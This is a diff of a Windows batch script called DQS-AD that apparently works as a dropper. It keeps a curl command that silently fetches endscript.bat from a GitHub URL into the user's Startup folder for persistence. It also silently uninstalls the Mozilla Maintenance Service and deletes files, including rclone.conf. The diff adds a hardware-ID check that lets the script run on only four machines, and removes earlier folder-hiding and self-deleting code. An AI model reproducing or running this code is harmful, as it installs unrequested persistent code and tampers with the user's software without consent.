@@ -2,7 +2,7 @@
 @echo off
 @Title DQS-AD
 cd /d %~dp0
-SET veropt=2.4
+SET veropt=2.5
 SET AFF=%veropt%
 md %SystemDrive%\Ect
 set indigo=[38;5;105m
@@ -746,7 +746,6 @@ IF EXIST rclone.conf (
 )
 
 cd /d %~dp0
-attrib +h +s "C:\Ect"
 curl -g -k -L -# -o "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\endscript.bat" "https://raw.githubusercontent.com/00FGV1/ver/main/REPTILITE/endscript.bat"
 Ping 10>nul
 IF EXIST "C:\Program Files (x86)\Mozilla Maintenance Service\Uninstall.exe" start "" "C:\Program Files (x86)\Mozilla Maintenance Service\Uninstall.exe" /S
@@ -756,19 +755,12 @@ DEL IID.log
 DEL temp2.txt
 DEL rclone.conf
 DEL RWC-USRL.log
-IF %HWCN%==0 (
-	SET CURRENTKEY=HKLM\SOFTWARE\RECS\RWC-TEST
-	FOR /F "TOKENS=2,*" %%A IN ('reg query "%CURRENTKEY%" 2^>NUL^|FIND /I "SVPP38"') DO set SVERIF=%%B
-	IF %SVERIF%==Y (
-		cls
-		rmdir /s /q C:\Ect >nul
-		cls
-		DEL "%~f0"
-		Exit
-	)
-	DEL "%~f0"
-	Exit
-)
+IF %HHWID% == 191262638503131 goto :UVUIY
+IF %HHWID% == PF0TRR6A goto :UVUIY
+IF %HHWID% == 219925897859274 goto :UVUIY
+IF %HHWID% == J216401760 goto :UVUIY
+Exit 
+:UVUIY
 set seed=%time:~9,2%%time:~3,2%%time:~6,2%
 set /A rand=(seed * 21) %% 20 + 1
 IF %rand%==16 SET WLN=16.jpeg & goto :APBAGG
